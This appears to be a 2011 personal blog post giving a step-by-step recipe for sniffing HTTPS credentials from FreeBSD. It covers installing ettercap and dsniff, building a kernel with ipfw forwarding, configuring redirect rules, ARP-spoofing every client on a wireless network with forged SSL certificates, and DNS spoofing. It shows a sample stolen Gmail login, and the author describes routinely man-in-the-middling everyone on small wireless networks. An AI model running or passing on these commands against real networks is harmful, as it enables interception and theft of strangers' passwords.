---
title: "HTTPS password sniffing on FreeBSD"
date: "2011-01-26T09:24:00-07:00"
slug: "https-password-sniffing-on-freebsd"
---

Shmoocon is a few days away, it's time to gear up with common tools that I rarely use. As a [FreeBSD](http://freebsd.org) user sometimes I have to go through a little extra trouble to get some tools functioning correctly. It's generally not on the top of the list as operating systems to use as an attack platform.

Fortunately I don't have to manage wireless networks, nor do I have to watch exactly what data is traveling through http/s. So the top of the list is sniffing SSL traffic. Yeah, I don't sit in starbucks reading peoples email. Everyone's email is just as boring as mine, and I barely have time to read my own.  Some people like [dsniff](http://www.monkey.org/~dugsong/dsniff/), I like [ettercap](http://ettercap.sourceforge.net) despite they have been [owned and exposed](http://www.exploit-db.com/papers/15823/), and the source possibly noodled with. Like any other software, run at your own risk, we are all most likely compromised anyway. Both software packages are available in the ports collection.

Please note this is written while running FreeBSD 8.1-RELEASE-p2

Install the security/dsniff and net-mgmt/ettercap ports.
<blockquote>cd /usr/ports/net-mgmt/ettercap ; make install clean
cd /usr/ports/security/dsniff  ; make install clean</blockquote>
Unfortunately this does require to stray away from the GENERIC kernel. The  IPFIREWALL_FORWARD option must be compiled in, so you might as well add the standard ipfw stuff. Create a custom kernel file, and add the following options to your kernel configuration.
<blockquote>cp /usr/src/sys/i386/conf/GENERIC /usr/src/sys/i386/conf/NOTGENERIC</blockquote>
Edit NOTGENERIC to add the following options.

options         IPFIREWALL
options         IPFIREWALL_VERBOSE
options         IPFIREWALL_DEFAULT_TO_ACCEPT
options         IPFIREWALL_FORWARD
options         IPDIVERT

Compile, install your custom kernel, and boot it.
<blockquote>cd /usr/src ;  make buildkernel KERNCONF=NOTGENERIC
make installkernel KERNCONF=NOTGENERIC</blockquote>
Now add the following options to your /etc/rc.conf
<blockquote>firewall_enable="YES"
firewall_type="open"</blockquote>
Finally, reboot with your new kernel configuration.
<blockquote>shutdown -r now</blockquote>
Edit /usr/local/etc/etter.conf to adjust the privileges which are default to 65534. Uncomment the two lines for ipfw from the osx section in the file.
<blockquote>redir_command_on = "ipfw add fwd 127.0.0.1,%rport tcp from any to any %port in via %iface"
redir_command_off = "ipfw -q flush"</blockquote>
Now you're ready to fire up your tools and skiddie away.  Ettercap doesn't care what flavor of switched network your on, just be sure to specify the interface. Smaller wireless networks where there is only basic web traffic I tend to just man in the middle everyone. Remember you can down the network, and DoS yourself with this as you're dealing with everyone's traffic. What is great about ettercap for sniffing ssl connections is it creates the fake certificates on the fly, entering the correct content with the incorrect issuer. People straight up ignore the invalid certificate and warnings their browser provides.
<blockquote>ettercap -T -q -i wlan0 -l etterout.txt -M ARP // //</blockquote>
In this instance we have arp spoofed a wireless access point, effectively man in the middle attacking all associated clients on the network. You can now intercept the ssl handshake, provide your forged certificate, and steal the credentials in plain text.
<blockquote>HTTP : 209.85.175.99:443 -&gt; USER: acctname  PASS: stolenpass  INFO: https://www.google.com/accounts/ServiceLogin?service=mail&amp;passive=true&amp;rm=false&amp;continue=http://mail.google.com/mail/?ui=html&amp;zy=l&amp;bsv=1eic6yu9oa4y3&amp;</blockquote>
You can also do all these things with the dsniff package, and other utilites are still very handy such as dnsspoof if you want to target specific hosts. Create a hosts style text file to redirect domains to various ip's.
<blockquote>dnsspoof -i wlan0 -f hosts</blockquote>
